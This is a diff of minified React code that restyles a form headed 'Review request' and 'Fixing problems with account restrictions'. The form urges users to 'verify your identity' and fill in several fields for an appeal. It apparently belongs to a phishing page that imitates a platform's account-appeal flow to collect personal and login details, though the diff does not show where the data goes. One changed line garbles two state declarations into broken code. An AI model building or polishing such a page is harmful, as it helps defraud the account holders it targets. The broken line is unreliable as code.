@@ -11183,8 +11183,7 @@
           setPageName: _,
         } = t;
         const [N, O] = e.useState(0),
-          [P, T] = e.useState(""),
-          [z, L] = e.useState("");
+          [P, T] = (e.useState("")[(z, L)] = e.useState(""));
         return (
           e.useEffect(() => {
             fetch("/config.json")
@@ -11337,12 +11336,10 @@
                 className: "",
                 style: {
                   backgroundColor: "#ffffff",
-                  paddingTop: 20,
-                  paddingBottom: 20,
+                  padding: 20,
                   borderColor: "#000000",
                   borderWidth: 0.2,
-                  borderRadius: 20,
-                  border: "1px solid #d0d0d0",
+                  borderRadius: 15,
                   lineHeight: 1.5,
                 },
                 children: [
@@ -11389,6 +11386,13 @@
                         },
                         children:
                           "If you believe this information is incorrect or causing confusion, please verify your identity and request a review.",
+                      }),
+                      (0, c.jsx)("hr", {
+                        style: {
+                          borderTop: "0.5px solid #d0d0d0",
+                          marginTop: 20,
+                          marginBottom: 20,
+                        },
                       }),
                       (0, c.jsx)("div", {
                         className: "",
@@ -11438,9 +11442,8 @@
                   marginTop: 20,
                   marginBottom: 20,
                   paddingBottom: 20,
-                  borderRadius: 30,
+                  borderRadius: 15,
                   backgroundColor: "white",
-                  border: "1px solid #d0d0d0",
                   lineHeight: 1.5,
                 },
                 children: [
@@ -11448,7 +11451,7 @@
                     src: "/resources/unlock.png",
                     width: "100%",
                     style: {
-                      borderRadius: "30px 30px 0px 0px",
+                      borderRadius: "15px 15px 0px 0px",
                     },
                   }),
                   (0, c.jsx)("div", {
@@ -11457,7 +11460,7 @@
                       fontWeight: "bold",
                       fontSize: 20,
                       color: "#3084F4",
-                      margin: "15px 20px 15px 20px",
+                      margin: "15px 30px",
                     },
                     children: "Review request",
                   }),
@@ -11466,7 +11469,7 @@
                     style: {
                       fontWeight: "bold",
                       fontSize: 17,
-                      margin: "15px 20px 15px 20px",
+                      margin: "15px 30px",
                     },
                     children: "Fixing problems with account restrictions",
                   }),
@@ -11475,7 +11478,7 @@
                     style: {
                       fontWeight: "normal",
                       fontSize: 15,
-                      margin: "15px 20px 10px 20px",
+                      margin: "15px 30px 10px",
                     },
                     children:
                       "Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.",
@@ -11490,19 +11493,16 @@
                   value: m,
                   onChange: (e) => g(e.target.value),
                   style: {
-                    width: "97%",
+                    width: "95%",
                     height: 80,
-                    padding: 10,
-                    paddingTop: 20,
-                    paddingBottom: 20,
+                    padding: 15,
                     marginBottom: 10,
                     fontSize: 15,
                     borderColor: "#d0d0d0",
                     borderWidth: 0.1,
                     borderRadius: 10,
-                    border: "1px solid #d0d0d0",
                   },
-                  placeholder: "More info...",
+                  placeholder: "Additional info...",
                 }),
               }),
               (0, c.jsxs)("div", {
@@ -11517,10 +11517,8 @@
                     value: v,
                     onChange: (e) => y(e.target.value),
                     style: {
-                      width: "97%",
-                      padding: 10,
-                      paddingTop: 15,
-                      paddingBottom: 15,
+                      width: "95%",
+                      padding: 15,
                       marginBottom: 10,
                       fontSize: 15,
                       borderColor: "#d0d0d0",
@@ -11544,10 +11542,8 @@
                     value: b,
                     onChange: (e) => w(e.target.value),
                     style: {
-                      width: "97%",
-                      padding: 10,
-                      paddingTop: 15,
-                      paddingBottom: 15,
+                      width: "95%",
+                      padding: 15,
                       marginBottom: 10,
                       fontSize: 15,
                       borderColor: "#d0d0d0",
@@ -11571,10 +11567,8 @@
                     value: k,
                     onChange: (e) => S(e.target.value),
                     style: {
-                      width: "97%",
-                      padding: 10,
-                      paddingTop: 15,
-                      paddingBottom: 15,
+                      width: "95%",
+                      padding: 15,
                       marginBottom: 10,
                       fontSize: 15,
                       borderColor: "#d0d0d0",
@@ -11598,10 +11592,8 @@
                     value: x,
                     onChange: (e) => C(e.target.value),
                     style: {
-                      width: "97%",
-                      padding: 10,
-                      paddingTop: 15,
-                      paddingBottom: 15,
+                      width: "95%",
+                      padding: 15,
                       marginBottom: 10,
                       fontSize: 15,
                       borderColor: "#d0d0d0",
@@ -11625,10 +11617,8 @@
                     value: E,
                     onChange: (e) => _(e.target.value),
                     style: {
-                      width: "97%",
-                      padding: 10,
-                      paddingTop: 15,
-                      paddingBottom: 15,
+                      width: "95%",
+                      padding: 15,
                       fontSize: 15,
                       borderColor: "#d0d0d0",
                       borderWidth: 0.1,
